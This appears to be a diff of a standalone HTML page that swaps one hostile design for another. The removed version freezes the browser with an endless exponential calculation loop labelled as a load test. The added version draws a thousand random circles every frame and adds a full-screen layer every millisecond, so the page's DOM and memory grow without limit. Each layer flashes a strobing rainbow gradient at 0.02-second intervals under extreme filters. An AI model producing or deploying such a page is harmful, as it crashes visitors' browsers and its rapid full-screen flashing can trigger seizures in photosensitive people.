@@ -1,43 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <style>
-    body {
-      background: black;
-      color: lime;
-      font-family: monospace;
+    html, body {
       margin: 0;
-      padding: 10px;
-      white-space: pre-wrap;
+      padding: 0;
+      overflow: hidden;
+      background: black;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+    .layer {
+      position: absolute;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      background: repeating-conic-gradient(from 0deg,
+        hsl(0, 100%, 50%) 0deg 10deg,
+        hsl(60, 100%, 50%) 10deg 20deg,
+        hsl(120, 100%, 50%) 20deg 30deg,
+        hsl(180, 100%, 50%) 30deg 40deg,
+        hsl(240, 100%, 50%) 40deg 50deg,
+        hsl(300, 100%, 50%) 50deg 60deg
+      );
+      animation: explode 0.02s infinite alternate;
+      mix-blend-mode: difference;
+      filter: hue-rotate(360deg) blur(10px) contrast(20) invert(1) saturate(3000%);
+    }
+
+    @keyframes explode {
+      0%   { transform: scale(1) rotate(0deg); opacity: 0.4; }
+      100% { transform: scale(3) rotate(360deg); opacity: 1; }
     }
   </style>
 </head>
 <body>
-<pre id="status">負荷開始...</pre>
-
+<canvas id="canvas"></canvas>
 <script>
-  const status = document.getElementById('status');
-  let iteration = 1;
-
-  function heavyCalc(exp) {
-    const limit = Math.floor(Math.pow(2, exp));
-    let sum = 0;
-    for (let i = 0; i < limit; i++) {
-      sum += Math.sqrt(i) * Math.sin(i);
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
+  const w = canvas.width = window.innerWidth;
+  const h = canvas.height = window.innerHeight;
+  function drawLoop() {
+    for (let i = 0; i < 1000; i++) {
+      ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
+      ctx.beginPath();
+      ctx.arc(Math.random()*w, Math.random()*h, Math.random()*80, 0, Math.PI * 2);
+      ctx.fill();
     }
-    return sum;
+    requestAnimationFrame(drawLoop);
   }
-
-  function runLoad() {
-    while(true) {
-      const result = heavyCalc(iteration);
-      status.textContent = `iteration: ${iteration}\n計算回数: 2^${iteration} = ${Math.floor(Math.pow(2, iteration))}\nresult: ${result.toFixed(2)}`;
-      iteration++;
-    }
+  drawLoop();
+  function spamLayer() {
+    const l = document.createElement("div");
+    l.className = "layer";
+    document.body.appendChild(l);
+    setTimeout(spamLayer, 1);
   }
-
-  runLoad();
+  spamLayer();
 </script>
 </body>
 </html>
